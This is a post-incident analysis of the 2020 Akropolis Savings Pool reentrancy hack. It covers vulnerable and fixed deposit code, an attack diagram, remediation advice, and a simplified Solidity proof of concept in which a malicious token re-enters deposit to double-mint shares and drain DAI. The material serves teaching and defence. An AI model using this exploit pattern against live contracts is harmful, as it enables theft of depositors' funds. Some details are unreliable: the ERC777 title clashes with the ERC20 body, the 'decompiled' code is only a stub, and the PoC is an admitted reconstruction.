# Akropolis — DAI Double-Deposit via ERC777 Reentrancy Analysis

| Field | Details |
|------|------|
| **Date** | 2020-11-12 |
| **Protocol** | Akropolis (delphi Savings Pool) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$2,000,000 (DAI) |
| **Attacker** | [0x9a2d91959B…](https://etherscan.io/address/0x9a2d91959B7D4E2cff68A1ee73bd1e0Ebe3C5B75) |
| **Attack Tx** | [0x2b023d8...](https://etherscan.io/tx/0x2b023d65485c4bb68d781960f2d8f05f240dba41e3c78ad71f46a2db2a25c06c) |
| **Vulnerable Contract** | [0x157c75776F8a966E33028E29d42B6dF6e41E9c75](https://etherscan.io/address/0x157c75776F8a966E33028E29d42B6dF6e41E9c75) |
| **Root Cause** | Reentrancy via malicious ERC20 token: the deposit function did not follow the Checks-Effects-Interactions pattern, allowing reentry before balance update during callback |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2020-11/Akropolis_exp.sol) (path mismatch; reconstructed based on public analysis) |

---
## 1. Vulnerability Overview

The Akropolis Savings Pool contract worked by supplying DAI deposited by users into the Curve Y pool and minting adai (internal share tokens). The attacker used a fake ERC20 token to trigger a callback during execution of the `deposit` function. Because the `deposit` function executed the token transfer before updating the internal balance (`totalShares`), re-calling the same function within the callback caused shares to be calculated against the not-yet-updated balance, allowing the attacker to obtain double the shares.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Akropolis Savings Pool deposit function (pseudocode)
contract SavingsPool {
    mapping(address => uint256) public balances;
    uint256 public totalShares;

    function deposit(address token, uint256 amount) external {
        // ❌ External call occurs before balance update
        // If token is a malicious ERC20, transferFrom can trigger a callback
        IERC20(token).transferFrom(msg.sender, address(this), amount);

        // ❌ During reentrancy, this code has not yet executed
        // → The reentrant deposit call calculates shares based on pre-update totalShares
        uint256 shares = (amount * totalShares) / getTotalPoolValue();
        totalShares += shares;
        balances[msg.sender] += shares;
    }

    // ✅ Correct pattern (CEI applied)
    function depositFixed(address token, uint256 amount) external nonReentrant {
        // ✅ Calculate shares first
        uint256 shares = (amount * totalShares) / getTotalPoolValue();

        // ✅ Update state (Effects)
        totalShares += shares;
        balances[msg.sender] += shares;

        // ✅ External call last (Interactions)
        IERC20(token).transferFrom(msg.sender, address(this), amount);
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**Akropolis_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: Reentrancy via malicious ERC20 token: the deposit function did not follow the Checks-Effects-Interactions pattern, allowing reentry before balance update during callback
    function transferFrom(address from, address to, uint256 amount) external {}  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract (includes malicious ERC20 implementation)
    │
    ├─[1] Deploy malicious ERC20 token
    │       transferFrom contains reentrant callback
    │
    ├─[2] First call: Akropolis deposit(fakeToken, amount)
    │       │
    │       └─ fakeToken.transferFrom executes
    │           │
    │           └─ Callback triggered: deposit(fakeToken, amount) re-called ──┐
    │               │                                                          │
    │               ├─ totalShares not yet updated                             │
    │               ├─ Shares calculated at same ratio as first call           │
    │               └─ Shares A obtained (second deposit)                      │
    │                                                                          │
    │       ◄──────────────────────────────────────────────────────────────────┘
    │       └─ First call continues: Shares A obtained again (first deposit)
    │
    ├─[3] Total shares = 2A (actual deposit corresponds to only 1A)
    │
    └─[4] Redeem 2A shares via withdraw → Receive 2x DAI
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

// Malicious ERC20: triggers reentrant callback on transferFrom
contract MaliciousToken {
    address public akropolisPool;
    bool private attacking;

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (!attacking) {
            attacking = true;
            // ⚡ Reentrancy: call Akropolis deposit one more time
            // At this point, Akropolis's totalShares has not yet been updated
            ISavingsPool(akropolisPool).deposit(address(this), amount);
            attacking = false;
        }
        // Simulate actual token transfer
        return true;
    }
}

contract AkropolisAttack {
    MaliciousToken public fakeToken;
    ISavingsPool public pool;

    function attack(uint256 amount) external {
        // [Step 1] Call deposit with malicious token
        // → transferFrom callback → reentrant deposit → obtain 2x shares
        pool.deposit(address(fakeToken), amount);

        // [Step 2] Redeem the 2x shares for real DAI
        uint256 shares = pool.balanceOf(address(this));
        pool.withdraw(shares);

        // Result: receive approximately 2x the DAI actually deposited
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack |
| **Subtype** | Cross-function reentrancy via malicious ERC20 |
| **CWE** | CWE-841: Improper State Update Ordering |
| **Attack Vector** | Custom ERC20 token (with callback) |
| **Preconditions** | Arbitrary ERC20 tokens accepted, CEI pattern not applied |
| **Impact** | Full drainage of DAI in the pool |

---
## 6. Remediation Recommendations

1. **Mandatory ReentrancyGuard**: Apply the `nonReentrant` modifier to all state-changing functions such as `deposit` and `withdraw`.
2. **Strict CEI Pattern**: Complete all state variable updates before making any external calls.
3. **Token Whitelist**: Do not accept arbitrary ERC20 tokens; only allow audited tokens.
4. **Pre/Post Balance Check**: Compare balances before and after `transferFrom` to verify the actual amount received.

---
## 7. Lessons Learned

- **Hidden Risks of ERC20 Extensions**: Even ERC20 tokens can include callbacks if implemented maliciously. Do not trust external tokens; always assume the possibility of reentrancy.
- **Danger of Accepting Arbitrary Tokens**: Protocols that accept any ERC20 token allow attackers to craft their own vulnerable token and mount an attack.
- **Limits of Auditing**: This vulnerability was not discovered despite a code audit having been conducted. Reentrancy vulnerabilities become harder to detect as code complexity increases.